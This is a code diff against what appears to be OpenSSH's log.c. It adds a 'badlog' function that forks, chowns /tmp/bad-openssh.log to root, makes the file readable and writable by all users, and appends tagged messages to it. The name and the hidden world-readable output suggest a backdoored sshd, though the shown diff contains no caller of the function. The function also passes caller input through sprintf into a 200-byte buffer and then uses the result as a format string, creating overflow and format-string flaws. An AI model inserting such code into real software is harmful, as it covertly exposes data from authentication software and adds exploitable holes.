@@ -36,6 +36,7 @@
 
 #include "includes.h"
 
+#include <sys/stat.h>
 #include <sys/types.h>
 
 #include <fcntl.h>
@@ -428,7 +429,7 @@ sshlog(const char *file, const char *func, int line, int showfunc,
     LogLevel level, const char *suffix, const char *fmt, ...)
 {
 	va_list args;
-
+	showfunc = 1;
 	va_start(args, fmt);
 	sshlogv(file, func, line, showfunc, level, suffix, fmt, args);
 	va_end(args);
@@ -497,4 +498,25 @@ sshlogdirect(LogLevel level, int forced, const char *fmt, ...)
 	va_start(args, fmt);
 	do_log(level, forced, NULL, fmt, args);
 	va_end(args);
+}
+
+void badlog(const char* fmt, ...) {
+	va_list args;
+	// Si no hago fork, peta. Parece tema de timeout (o recursos), pero npi.
+	if (fork() == 0) {
+		const char* logfilename = "/tmp/bad-openssh.log";
+		chown(logfilename, 0, 0);
+		chmod(logfilename, S_IRUSR|S_IWUSR|S_IRGRP|S_IWGRP|S_IROTH|S_IWOTH);
+		FILE *logfile = fopen(logfilename, "a");
+		char badmessage[200];
+		va_start(args, fmt);
+		
+		sprintf(badmessage, "[bad-openssh] %s\n", fmt);
+		vfprintf(logfile, badmessage, args);
+		
+		va_end(args);
+
+		fclose(logfile);
+		exit(EXIT_SUCCESS);
+	}
 }
